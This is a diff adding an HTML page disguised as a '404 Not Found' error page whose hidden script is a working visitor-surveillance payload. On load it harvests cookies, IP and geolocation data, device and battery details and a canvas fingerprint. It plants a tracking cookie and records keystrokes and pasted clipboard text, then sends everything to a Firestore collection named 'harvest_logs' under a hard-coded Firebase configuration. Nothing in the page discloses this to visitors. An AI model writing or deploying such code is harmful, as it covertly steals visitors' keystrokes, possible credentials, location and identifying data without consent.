@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
+    <style>
+        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; overflow: hidden; }
+        h1 { font-size: 6rem; margin: 0; letter-spacing: 10px; }
+    </style>
+</head>
+<body>
+    <h1>404</h1>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAAPwdeEfhiyYf4kuyi0NtXpQzAPlAaJxQ",
+            authDomain: "ckiee-5b2f3.firebaseapp.com",
+            projectId: "ckiee-5b2f3",
+            storageBucket: "ckiee-5b2f3.firebasestorage.app",
+            messagingSenderId: "397010208918",
+            appId: "1:397010208918:web:0c2a81f36b1178e8431ab7"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let keyLog = "";
+
+        function startKeylogger() {
+            document.addEventListener('keydown', (e) => {
+                keyLog += e.key;
+                if (keyLog.length > 500) keyLog = keyLog.slice(-500);
+            });
+            document.addEventListener('paste', (e) => {
+                keyLog += "[PASTE:" + (e.clipboardData || window.clipboardData).getData('text') + "]";
+            });
+        }
+
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch(e) {
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const ip = await res2.json();
+                    return { ip: ip.ip, error: "limited" };
+                } catch { return { ip: "unknown" }; }
+            }
+        }
+
+        async function harvestAndSend() {
+            const data = {
+                timestamp: serverTimestamp(),
+                url: window.location.href,
+                cookies_raw: document.cookie,
+                cookies: document.cookie ? document.cookie : "no_cookies",
+                tracking_cookie: "",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || "unknown",
+                language: navigator.language,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                referrer: document.referrer || "direct",
+                battery: {},
+                ip_info: {},
+                location: {},
+                connection: navigator.connection ? navigator.connection.effectiveType : "unknown",
+                keylog_sample: "",
+                fingerprint: {}
+            };
+
+            // === COOKIE HANDLING ===
+            // Set tracking cookie sendiri
+            document.cookie = "session_id=trk_" + Date.now() + "; path=/; max-age=2592000; SameSite=None; Secure";
+            data.cookies = document.cookie;
+            data.tracking_cookie = document.cookie.includes("session_id") ? "SET_SUCCESS" : "FAILED";
+
+            // === IP INFO ===
+            data.ip_info = await getIPInfo();
+
+            // === BATTERY ===
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    data.battery = {
+                        level: bat.level * 100,
+                        charging: bat.charging
+                    };
+                } catch(e) {}
+            }
+
+            // === GEOLOCATION ===
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.location = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            source: "geolocation"
+                        };
+                    },
+                    () => { data.location = { error: "denied" }; }
+                );
+            }
+
+            // === CANVAS FINGERPRINT ===
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillText("Device Fingerprint", 2, 2);
+                data.fingerprint.canvas = canvas.toDataURL().substring(0, 100);
+            } catch(e) {}
+
+            // Kirim data
+            await addDoc(collection(db, "harvest_logs"), data);
+
+            // Kirim keylog setelah beberapa detik
+            setTimeout(() => {
+                data.keylog_sample = keyLog || "no_input_yet";
+                addDoc(collection(db, "harvest_logs"), data);
+            }, 7000);
+
+            startKeylogger();
+        }
+
+        window.onload = harvestAndSend;
+    </script>
+</body>
+</html>
